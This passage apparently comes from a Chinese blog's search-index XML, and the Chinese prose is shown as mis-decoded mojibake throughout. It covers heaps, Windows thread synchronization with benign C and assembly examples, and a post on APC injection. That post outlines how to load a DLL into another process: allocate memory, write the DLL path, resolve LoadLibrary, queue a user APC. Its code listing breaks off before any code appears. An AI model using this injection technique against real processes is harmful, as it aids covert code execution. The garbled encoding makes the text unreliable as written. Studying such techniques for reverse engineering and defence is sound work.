ä¼˜å…ˆé˜Ÿåˆ—ï¼Œæˆ‘ä»¬éœ€è¦2nçš„ç©ºé—´ã€‚è¿™å¾ˆæ˜æ˜¾æ˜¯ä¸åˆ’ç®—çš„ã€‚åŒæ—¶ä¸ºäº†å‡ºé˜Ÿï¼Œæˆ‘ä»¬è¿˜è¦æŠŠå‡ºé˜Ÿå…ƒç´ æ”¾åˆ°é˜Ÿé¦–(å› ä¸ºåªæœ‰é˜Ÿé¦–æ‰èƒ½å‡ºé˜Ÿ)ï¼Œäºæ˜¯æˆ‘ä»¬ä½¿ç”¨äº†å †ã€‚</p><h3 id="å †">å †</h3><p>å †æ˜¯ä¸€é¢—å®Œå…¨äºŒå‰æ ‘ï¼ŒåŠ å…¥èŠ‚ç‚¹éœ€è¦åœ¨æœ€ä¸‹é¢ä¸€å±‚ä»å·¦åˆ°å³æ’åˆ—ã€‚å †åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ä¸ªå«å¤§é¡¶å †ä¸€ä¸ªå«å°é¡¶å †ï¼Œå®ƒä»¬çš„æ€§è´¨åˆ†åˆ«æ˜¯äºŒå‰æ ‘çš„çˆ¶èŠ‚ç‚¹å¤§äº/å°äºå­èŠ‚ç‚¹ï¼Œåœ¨åˆå§‹èµ‹å€¼æ—¶ï¼Œå¯èƒ½ä¸æ»¡è¶³è¿™ä¸ªè¦æ±‚ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œè°ƒæ•´ï¼š</p><ul><li>å¯¹äºæ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯å¦æ»¡è¶³ï¼Œä¸æ»¡è¶³ï¼Œå’Œå­èŠ‚ç‚¹çš„å€¼äº¤æ¢ï¼Œæ»¡è¶³ï¼Œç»§ç»­ ä¸‹ä¸€æ­¥</li><li>é€’å½’å¯¹å­èŠ‚ç‚¹æ‰§è¡Œä¸Šé¢çš„æ“ä½œï¼Œç›´åˆ°è¿™ä¸ªå­èŠ‚ç‚¹æ²¡æœ‰å­èŠ‚ç‚¹</li></ul><p>æ—¶é—´å¤æ‚åº¦ä¸º$O(n)$ï¼Œå› ä¸ºå¯¹æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æ‰§è¡Œäº†ä¸Šé¢çš„å†…å®¹</p><p>åˆ é™¤æ—¶åŒæ ·æ˜¯å…ˆæ”¾åˆ°æœ€ä¸‹é¢ä¸€å±‚æœ€åï¼ˆå’Œæœ€åä¸€ä¸ªå…ƒç´ äº¤æ¢ï¼‰è¦ä¿æŒå®Œå…¨äºŒå‰æ ‘çš„æ€§è´¨ã€‚ç„¶åäº¤æ¢åè°ƒæ•´ä¸ºå¯¹åº”é¡¶å †çš„æ€§è´¨</p><h1>å½’å¹¶æ’åº</h1><h1>åŸºæ•°æ’åº</h1><h1>å¤–éƒ¨æ’åº</h1><p>table[5*k+1]</p>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> æ•°æ®ç»“æ„ä¸ç®—æ³• </category>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>win-å¹¶å‘ä¸åŒæ­¥</title>
      <link href="/posts/e563aa6c.html"/>
      <url>/posts/e563aa6c.html</url>
      
        <content type="html"><![CDATA[<p>ä¸Šä¸€ç¯‡å­¦ä¹ äº†åŸºæœ¬çš„è¿›ç¨‹å’Œçº¿ç¨‹ï¼Œè¿™é‡Œç»§ç»­å­¦ä¹ Windowsçš„å¹¶å‘ä¸åŒæ­¥<br>ã€ŠWindowså†…æ ¸åŸç†ä¸å®ç°ã€‹</p><h2 id="å¹¶å‘ä¸åŒæ­¥">å¹¶å‘ä¸åŒæ­¥</h2><p>ä¸ºäº†ä¿è¯æ“ä½œç³»ç»Ÿå’Œåº”ç”¨æœ‰åºåœ°æ‰§è¡Œï¼Œå®ƒä»¬è¯»å–å’Œè®¿é—®çš„æ•°æ®åº”å½“æ˜¯æœ‰æ•ˆçš„ã€‚å¦‚æœAçº¿ç¨‹ä½¿ç”¨äº†èµ„æºç”²ï¼Œè¿›è¡Œäº†ä¿®æ”¹ï¼ŒåŒæ—¶Bçº¿ç¨‹ä¹Ÿå¯¹èµ„æºç”²è¿›è¡Œäº†ä¿®æ”¹ï¼Œä¿å­˜æ—¶å°±ä¼šäº§ç”Ÿå†²çªï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ç§(å¤šç§)æœºåˆ¶å»æ§åˆ¶å„ä¸ªçº¿ç¨‹çš„é¡ºåºä½¿å¾—å®ƒä»¬å¯¹èµ„æºçš„ä½¿ç”¨æ˜¯åè°ƒçš„ã€åˆç†çš„ã€å®‰å…¨çš„ã€‚</p><p><img src="https://s2.loli.net/2024/11/18/Ti2DFcLhquH8Qov.png" alt="å¹¶å‘çš„æ¥æº"></p><h3 id="åŸºç¡€">åŸºç¡€</h3><p>ç†æƒ³æƒ…å†µä¸‹,å¦‚æœæ‰€æœ‰è¿›ç¨‹éƒ½å…·æœ‰æ‰§è¡Œæ¡ä»¶,ç³»ç»Ÿä¼šç›´æ¥æ ¹æ®ä¼˜å…ˆçº§é¡ºåºå°†å¤„ç†å™¨èµ„æºåˆ†é…ç»™å„ä¸ªçº¿ç¨‹ã€‚å› è€Œå”¯ä¸€å¯èƒ½çš„çº¿ç¨‹å†²çªå°±æ˜¯ä¼˜å…ˆçº§çš„å†²çªã€‚è¿™å¾ˆå¥½è§£å†³ï¼Œåªè¦è®©é«˜ä¼˜å…ˆçº§çš„ä¼˜å…ˆæ‰§è¡Œå°±å¥½äº†ã€‚ä½†æ˜¯å¾ˆæœ‰å¯èƒ½æœ‰çš„çº¿ç¨‹ä¾èµ–å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œæˆ–è€…ä¾èµ–ç³»ç»Ÿçš„æŸä¸ªä¿¡å·å’ŒçŠ¶æ€ã€‚</p><p>çœ‹ä¸‹é¢è¿™ä¸ªä¹¦ä¸­çš„ä¾‹å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> g_nCount;</span><br><span class="line">DWORD <span class="title function_">ComputeThreadProc</span><span class="params">(PLVOID pParam)</span>&#123;</span><br><span class="line">    g_nCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(g_nCount++&lt;<span class="number">100</span>)&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> g_nCount;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ControlThreadProc</span><span class="params">(PLVOID pRaram)</span>&#123;</span><br><span class="line">    CreateThread(ComputeThreadProc);</span><br><span class="line">    g_nCount=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰§è¡ŒControlThreadProcå‡½æ•°ï¼Œå¯èƒ½å‘ç”Ÿä»€ä¹ˆï¼ŒComputeThreadProcä¸­çš„æ±‡ç¼–å¯èƒ½æŠŠg_nCountä¿å­˜åœ¨ä¸¤ä¸ªå¯„å­˜å™¨ä¸­ï¼Œç”¨RCXæ¥å¾ªç¯ï¼Œç”¨RAXæ¥æ‰§è¡Œæ¯ä¸€è½®æœ€åçš„åˆ¤æ–­ï¼Œé‚£ä¹ˆå¦‚æœä¸»çº¿ç¨‹å†…æ‰§è¡Œäº†g_nCount=100;ï¼Œå´è¢«RCXèµ‹å€¼äº†ï¼Œé‚£ä¹ˆå®ƒå°±ä¸ä¼šåœæ­¢</p><p><img src="https://s2.loli.net/2024/11/18/cqb9BgR38V61SOC.png" alt="image-20241118135849061"></p><p>æ‰€ä»¥ï¼Œå¤šçº¿ç¨‹é€šä¿¡æ—¶ï¼Œå¿…é¡»ä¿è¯å¯¹å˜é‡çš„æ“ä½œä¸ºåŸå­æ“ä½œæˆ–è€…å¯¹å˜é‡çš„è®¿é—®æ˜¯äº’æ–¥çš„ã€‚</p><p>å¤„ç†å™¨ä¸­æœ‰äº›è‡ªå¸¦çš„åŸå­æ“ä½œå‘½ä»¤ï¼ŒåŸºæœ¬çš„æŒ‡ä»¤å‰åŠ lockå³æ˜¯åŸå­æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LONG FASTCALL InterlockerIncrement(IN OUT LONG volatile *addr)</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">        mov eax,1</span><br><span class="line">        mov ecx,addr</span><br><span class="line">        lock xadd [ecx],eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œé€šè¿‡lock xaddï¼Œè¿™ç»„æŒ‡ä»¤å°±ä¼šå˜æˆåŸå­æ“ä½œï¼Œå…¶å®ƒçº¿ç¨‹çš„æ“ä½œä¸èƒ½æ’å…¥åˆ°è¿™ä¸ªè¿‡ç¨‹ä¸­</p><h3 id="é€šè®¯ä¸åŒæ­¥">é€šè®¯ä¸åŒæ­¥</h3><p>æ­£å¦‚ä¸Šé¢æ‰€è¯´ï¼Œä¸ºäº†ä½¿ç¨‹åºä»¥æ­£å¸¸çš„é¡ºåºè¿›è¡Œï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æœºåˆ¶å»åè°ƒè¿›ç¨‹/çº¿ç¨‹å¯¹æŸäº›æ•°æ®çš„æ“ä½œï¼Œä»¥é€šè®¯ä¸ºåŸºç¡€çš„åŒæ­¥æœºåˆ¶å°±è¿™æ ·è¯ç”Ÿäº†ã€‚ä¸‹é¢çš„æ“ä½œå‡ä¸ºåŸå­æ“ä½œ</p><h4 id="äº’æ–¥å’Œäº’æ–¥ä½“">äº’æ–¥å’Œäº’æ–¥ä½“</h4><p>äº’æ–¥æŒ‡ä¸€ä¸ªå…±äº«èµ„æºï¼Œä»»ä½•æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªä¸»ä½“å¯ä»¥è®¿é—®ã€‚Windowsä¸­å¯ä»¥é€šè¿‡äº’æ–¥ä½“å®ç°è·¨è¿›ç¨‹çš„è®¿é—®</p><h5 id="äº’æ–¥ä½“åŒæ­¥å¯¹è±¡">äº’æ–¥ä½“åŒæ­¥å¯¹è±¡</h5><p>è¯¥å¯¹è±¡æœ‰ä¸¤ç§çŠ¶æ€ï¼Œæœ‰ä¿¡å·å’Œæ— ä¿¡å·ï¼Œæœ‰ä¿¡å·è¡¨ç¤ºè¯¥å¯¹è±¡å½“å‰æ— äººè®¿é—®ã€‚æ— ä¿¡å·è¡¨ç¤ºå…¶å·²è¢«æŸçº¿ç¨‹æ‹¥æœ‰ï¼Œåªæœ‰å½“è¯¥çº¿ç¨‹é‡Šæ”¾æ‰€æœ‰æƒåå®ƒæ‰ä¼šå˜ä¸ºæœ‰ä¿¡å·çŠ¶æ€ã€‚</p><h4 id="ä¿¡å·é‡">ä¿¡å·é‡</h4><p>å¯¹äºä¸€ä¸ªèµ„æºï¼Œæœ‰ä¸€ä¸ªæ ‡è¯†å€¼è¯´æ˜å½“å‰æœ‰å¤šå°‘å¯¹è±¡åœ¨ä½¿ç”¨è¿™ä¸ªèµ„æºï¼Œè¿™ä¸ªå€¼æ˜¯ä¿¡å·é‡ï¼Œå½“å€¼ä¸ºxæ—¶ï¼Œè¡¨ç¤ºè¿˜å¯ä»¥æœ‰xä¸ªå¯¹è±¡è®¿é—®å®ƒï¼Œè®¿é—®å«åšDOWNï¼Œæ¯æ¬¡è®¿é—®ä½¿x-1ï¼Œå¦‚æœxæœ¬èº«ä¸º0ï¼Œå½“å‰çº¿ç¨‹é˜»å¡ã€‚å½“å¯¹è±¡è®¿é—®ç»“æŸæ—¶ï¼Œæ‰§è¡ŒUPæ“ä½œï¼Œä½¿x+1ç„¶åä»¤ä¸€ä¸ªé˜»å¡çš„çº¿ç¨‹æ‰§è¡ŒDOWNè·å¾—èµ„æºçš„æ“ä½œæƒé™</p><h4 id="é”">é”</h4><p>å’Œå‰é¢çš„ç±»ä¼¼ï¼Œå¦‚æœå€¼ä¸º1ï¼Œåˆ™ä¸å¯è®¿é—®å¹¶è¢«é˜»å¡ï¼Œå¦‚æœä¸º0åˆ™å¯ä»¥è®¿é—®ï¼ŒåŒæ—¶æœ‰å±€éƒ¨å’Œå…¨å±€ä¹‹åˆ†ï¼Œå¦‚æœæ˜¯å±€éƒ¨é”ï¼Œå®ƒåªæ§åˆ¶ä¸€ä¸ªå°åŒºåŸŸï¼Œåä¹‹æ˜¯å…¨å±€çš„æ§åˆ¶ã€‚</p><h4 id="ä¸´ç•ŒåŒº">ä¸´ç•ŒåŒº</h4><p>å¯¹äºä¸€æ®µä¸´ç•ŒåŒºä»£ç ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨å…¶ä¸­æ‰§è¡Œã€‚å¦‚æœä¸€ä¸ªæ•°æ®åªåœ¨ä¸´ç•ŒåŒºä¸­è¢«è®¿é—®ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®ä¹Ÿæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</p><p>ä¸´ç•ŒåŒºå¯ä»¥ä¸è¿ç»­ï¼Œä½†æ˜¯åœ¨è¿›å…¥æ—¶å¿…é¡»è§¦å‘enterå‡½æ•°ï¼Œç¦»å¼€æ—¶è§¦å‘leaveå‡½æ•°ä»¥ç”¨ä¸Šé¢å‡ ç§æ–¹æ³•é˜²æ­¢åŒæ—¶è®¿é—®</p><h4 id="è‡ªæ—‹é”å’Œå¿™ç­‰å¾…">è‡ªæ—‹é”å’Œå¿™ç­‰å¾…</h4><p>å¿™ç­‰å¾…ï¼šä¸æ–­é‡å¤æ£€æŸ¥ä»¥ç¬¬ä¸€æ—¶é—´è·å¾—ä¿¡æ¯ã€‚<br>è‡ªæ—‹é”é€šè¿‡å¿™ç­‰å¾…å®ç°ä¸€ä¸ªCPUåœ¨ä¸€æ®µæ—¶é—´å†…å¯¹ä¸€ä¸ªèµ„æºçš„åŒæ—¶æ‹¥æœ‰ï¼Œå³å…¶å®ƒCPUä¼šåœ¨è¿™æ—¶é‡å¤æ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨è¿™ä¸ªèµ„æºï¼Œç›´åˆ°æ‰€æœ‰æƒé‡Šæ”¾</p><h4 id="æ¶ˆæ¯">æ¶ˆæ¯</h4><p>æ¥æ”¶å’Œå‘é€ã€‚ä¸¤ä¸ªè¿›ç¨‹å¯ä»¥ç›¸äº’æ¥æ”¶å’Œå‘é€æ¶ˆæ¯ï¼Œå…·ä½“å®ç°éœ€è¦ä¾èµ–å…¶å®ƒåŒæ­¥åŸè¯­</p><h3 id="åŒæ­¥é—®é¢˜">åŒæ­¥é—®é¢˜</h3><h4 id="æ­»é”">æ­»é”</h4><blockquote><p>å¦‚æœä¸€ç»„çº¿ç¨‹ä¸­çš„æ¯ä¸ªçº¿ç¨‹éƒ½åœ¨ç­‰å¾…åªèƒ½ç”±å…¶ä»–çº¿ç¨‹æ‰èƒ½æ»¡è¶³çš„æ¡ä»¶ï¼Œé‚£ ä¹ˆè¿™ç»„çº¿ç¨‹æ˜¯æ­»é”çš„ï¼Œæ‰€æœ‰çš„çº¿ç¨‹éƒ½å°†ç»§ç»­ç­‰å¾…ï¼Œæ— æ³•å‰è¿›ã€‚</p></blockquote><p>é“¶è¡Œå®¶ç®—æ³•</p><h4 id="é¥¥é¥¿">é¥¥é¥¿</h4><blockquote><p>é¥¥é¥¿æ˜¯æŒ‡ä¸€ä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹æ»¡è¶³æ‰§è¡Œçš„æ¡ä»¶ï¼Œä½†ä¸€ç›´å¾—ä¸åˆ°æ‰§è¡Œï¼Œç”šè‡³ æ°¸è¿œå¾—ä¸åˆ°æ‰§è¡Œï¼ˆâ€œé¥¿æ­»â€ï¼‰ã€‚é¥¥é¥¿é€šå¸¸æ˜¯ç”±èµ„æºåˆ†é…ç­–ç•¥å¼•èµ·çš„ï¼Œæ¯”å¦‚ç”±äºç­–ç•¥è€Œå¯¼ è‡´ä¸å…¬å¹³ï¼Œæœ‰äº›èµ„æºè¯·æ±‚åœ¨ç‰¹å®šçš„æƒ…å½¢ä¸‹æ°¸è¿œå¾—ä¸åˆ°æ»¡è¶³ã€‚</p></blockquote><h4 id="ä¼˜å…ˆçº§åè½¬">ä¼˜å…ˆçº§åè½¬</h4><blockquote><p>ä¼˜å…ˆçº§åè½¬æ˜¯æŒ‡è¿™æ ·çš„é—®é¢˜ï¼šåœ¨çº¿ç¨‹è°ƒåº¦æ—¶ï¼Œä¸€ä¸ªä½ä¼˜å…ˆçº§çš„çº¿ç¨‹å æœ‰ä¸€ä¸ªå…±äº«èµ„æºï¼Œ ä»è€Œå¯¼è‡´é«˜ä¼˜å…ˆçº§çš„çº¿ç¨‹è™½ç„¶å…¶ä»–è¿è¡Œæ¡ä»¶éƒ½æ»¡è¶³ï¼Œä½†å› ä¸ºå¾—ä¸åˆ°è¯¥èµ„æºè€Œæ— æ³•è¿è¡Œã€‚åœ¨ é‡‡ç”¨æŠ¢å å¼è°ƒåº¦ç®—æ³•çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œå½“ä½ä¼˜å…ˆçº§çš„çº¿ç¨‹å æœ‰äº†èµ„æºæ—¶ï¼Œå®ƒæœ‰å¯èƒ½è¢«ä¸­ç­‰ä¼˜ å…ˆçº§çš„å…¶ä»–çº¿ç¨‹æŠ¢å ï¼Œä»è€Œå¯¼è‡´é«˜ä¼˜å…ˆçº§çš„çº¿ç¨‹åœ¨æ›´é•¿æ—¶é—´å†…æ— æ³•è¿è¡Œï¼Œå®é™…çš„æ•ˆæœå°±æ˜¯ï¼Œ ç›¸å½“äºæŠŠé«˜ä¼˜å…ˆçº§çš„çº¿ç¨‹é™åˆ°ä½ä¼˜å…ˆçº§äº†ã€‚</p></blockquote><h3 id="ä¸­æ–­ä¸å¼‚å¸¸">ä¸­æ–­ä¸å¼‚å¸¸</h3><h4 id="ä¸­æ–­">ä¸­æ–­</h4><p>å…¶å®ƒè®¾å¤‡ï¼ˆæ¯”å¦‚IOï¼‰éœ€è¦CPUå“åº”æ—¶ï¼Œä¼šå‘é€ç¡¬ä»¶ä¸­æ–­ç»™CPUï¼Œä»¤å…¶æ‰§è¡Œé‚£ä¸ªè®¾å¤‡éœ€è¦æ‰§è¡Œçš„å†…å®¹ã€‚å†…æ ¸ä¸­çš„ä»£ç ä¹Ÿå¯ä»¥å‘é€è½¯ä»¶ä¸­æ–­ï¼Œæ¯”å¦‚æ‰§è¡Œçº¿ç¨‹è°ƒåº¦ã€‚CPUå¯ä»¥å±è”½ä¸­æ–­ç”¨æ¥ä¸“æ³¨æ‰§è¡Œä¸€æ®µæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯ä½¿å…¶å˜ä¸ºåŸå­æ“ä½œã€‚</p><h4 id="å¼‚å¸¸">å¼‚å¸¸</h4><p>å¼‚å¸¸ä¹Ÿåˆ†ä¸ºè½¯ä»¶å¼‚å¸¸å’Œç¡¬ä»¶å¼‚å¸¸ã€‚å®ƒå’Œå½“å‰çš„ä»£ç /çº¿ç¨‹æœ‰å…³ã€‚ç¡¬ä»¶å¼‚å¸¸æœ‰ï¼šé™¤é›¶é”™è¯¯ï¼Œç¼ºé¡µé”™è¯¯ç­‰ã€‚è½¯ä»¶å¼‚å¸¸æœ‰ï¼šè½¯ä»¶æ–­ç‚¹é™·é˜±ç­‰ã€‚å½“è§¦å‘å¼‚å¸¸æ—¶ï¼Œä¼šæŒ‰ç…§å›ºå®šæµç¨‹æ‰§è¡Œå¤„ç†å¼‚å¸¸çš„ä»£ç ï¼Œå¹¶å¯¼è‡´ä¸åŒçš„ç»“æœ(å´©æºƒ/ç»§ç»­æ‰§è¡Œ)</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> Winæ ¸å¿ƒ </category>
          
          <category> Winå†…æ ¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤šçº¿ç¨‹ </tag>
            
            <tag> é” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APCæ³¨å…¥</title>
      <link href="/posts/5fe10d5b.html"/>
      <url>/posts/5fe10d5b.html</url>
      
        <content type="html"><![CDATA[<h2 id="å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨">å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨</h2><p>Windowså†…æ ¸åŸç†ä¸å®ç°ä¸€ä¹¦ï¼š</p><p><img src="https://s2.loli.net/2024/11/18/MYfU1hFZHWbRvGV.png" alt="image-20241118124618497"></p><p><img src="https://s2.loli.net/2024/11/18/Zlq4GQ8nECaWxvi.png" alt="image-20241118124635696"></p><blockquote><p>APCï¼ˆAsynchronous Procedure Callï¼‰å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨æ˜¯ä¸€ç§<code>Windows</code>æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒæœºåˆ¶ï¼Œå®ƒå…è®¸åœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°ï¼Œè€Œæ— éœ€åˆ›å»ºçº¿ç¨‹æˆ–ç­‰å¾…OSæ‰§è¡Œå®Œæˆã€‚è¯¥æœºåˆ¶é€‚ç”¨äºä¸€äº›é¢‘ç¹çš„ã€çŸ­æš‚çš„æˆ–éå¸¸ç»†å¾®çš„æ“ä½œï¼Œä¾‹å¦‚æ”¹å˜çº¿ç¨‹ä¼˜å…ˆçº§æˆ–é€šçŸ¥çº¿ç¨‹å¤„ç†ä»»åŠ¡ã€‚åœ¨<code>APCæœºåˆ¶</code>ä¸­ï¼Œå½“æŸäº›äº‹ä»¶å‘ç”Ÿæ—¶ï¼ˆä¾‹å¦‚æ–‡ä»¶IOï¼Œç½‘ç»œIOæˆ–å®šæ—¶å™¨è§¦å‘ï¼‰ï¼Œè¿™äº›äº‹ä»¶å°†è¢«æ“ä½œç³»ç»Ÿæ·»åŠ åˆ°ä¸€ä¸ª<code>APCé˜Ÿåˆ—</code>ä¸­ï¼Œè¯¥é˜Ÿåˆ—ç»‘å®šåˆ°æ‰§è¡Œçº¿ç¨‹ã€‚åœ¨ä¸‹ä¸€æ¬¡å‘ç”Ÿ<code>ALERTABLE</code>çš„äº‹ä»¶æ—¶ï¼ˆä¾‹å¦‚è°ƒç”¨SleepExæˆ–SignalObjectAndWaitæ—¶ï¼‰ï¼ŒOSå°†å¼¹å‡º<code>APCå‡½æ•°</code>å¹¶åœ¨æ‰§è¡Œçº¿ç¨‹ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¹¶åœ¨æ‰§è¡Œå®Œæ¯•åæ¢å¤çº¿ç¨‹æ‰§è¡Œã€‚</p></blockquote><p>ç®€è¦æ¥è¯´ï¼Œä¸€æ—¦è¿›ç¨‹/çº¿ç¨‹è¯·æ±‚æŸäº›æ“ä½œï¼ˆæ¯”å¦‚æ–‡ä»¶æ“ä½œï¼‰ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†å®ƒä»¬åŠ å…¥åˆ°å¯¹åº”çº¿ç¨‹çš„APCé˜Ÿåˆ—ï¼Œå½“çº¿ç¨‹æ¢å¤æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä¾æ¬¡æ‰§è¡Œé˜Ÿåˆ—é‡Œçš„å‡½æ•°è¿‡ç¨‹ã€‚APCé˜Ÿåˆ—åˆ†ä¸ºå†…æ ¸APCé˜Ÿåˆ—å’Œç”¨æˆ·APCé˜Ÿåˆ—ï¼ŒåŒæ—¶ä¸¤ç§åˆåˆ†ä¸ºæ™®é€šå’Œç‰¹æ®Šã€‚å¯¹äºå†…æ ¸é˜Ÿåˆ—ï¼Œå…¶ä¸­çš„APCä¼šä¼˜å…ˆäºç”¨æˆ·é˜Ÿåˆ—æ‰§è¡Œå®Œï¼Œç­‰åˆ°ä»R0å›åˆ°R3ï¼Œå°±ä¼šæ‰§è¡Œä¸€ä¸ªç”¨æˆ·æ™®é€šAPCã€‚ç”±äºç‰¹æ®Šç”¨æˆ·APCä¼šç›´æ¥æŒ‚åˆ°é˜Ÿåˆ—å¼€å¤´ï¼Œæ‰€ä»¥ç‰¹æ®ŠAPCæ€»ä¼šä¼˜å…ˆæ‰§è¡Œï¼Œä¸”ä¸€æ¬¡æ€§æ‰§è¡Œå…¨éƒ¨ã€‚</p><p>è¯¦è§ï¼š<br>[<a href="https://bbs.kanxue.com/thread-276036.htm">åŸåˆ›]Win10 x64 APCçš„åˆ†æä¸ç©æ³•-è½¯ä»¶é€†å‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><h2 id="APCæ³¨å…¥">APCæ³¨å…¥</h2><p>é€šè¿‡å‘ç›®æ ‡è¿›ç¨‹åŠ å…¥APCå°±å¯ä»¥å®ç°è®©å®ƒè¯»å–DLLçš„æ“ä½œï¼Œç”±äºæˆ‘æ²¡æœ‰R0æƒé™(æ²¡å­¦ææƒ)ï¼Œåªèƒ½åœ¨R3ä¸‹å°è¯•æ·»åŠ ç”¨æˆ·APCã€‚</p><h3 id="æ¡ä»¶">æ¡ä»¶</h3><p>å¿…é¡»å¤„äºå¯å”¤é†’çŠ¶æ€ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°è¾¾æˆæ•ˆæœ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SleepEx</span>(xxx,True);</span><br><span class="line"><span class="built_in">MsgWaitForMultipleObjectsEx</span>(xxx,xxx,xxx,xxx,True);</span><br><span class="line"><span class="built_in">WaitForSingleObjectEx</span>(xxx,xxx,True);</span><br><span class="line"><span class="built_in">WaitForMultipleObjectEx</span>(xxx,xxx,xxx,xxx,True);</span><br><span class="line"><span class="built_in">SignalObjectAndWait</span>(xxx,xxx,xxx,True);</span><br></pre></td></tr></table></figure><p>å…·ä½“æµç¨‹ä¸ºï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è·å–ç›®æ ‡pid-&gt;ç”³è¯·ç©ºé—´-&gt;å†™å…¥DLLè·¯å¾„-&gt;è·å–LoadLibraryåœ°å€-&gt;ç”¨APCæŒ‚é’©å‡½æ•°æŒ‚ä¸ŠLoadLibraryå‡½æ•°ï¼Œä¼ å‚DLLè·¯å¾„</span><br></pre></td></tr></table></figure><p>ç›´æ¥å†™ä»£ç å³å¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 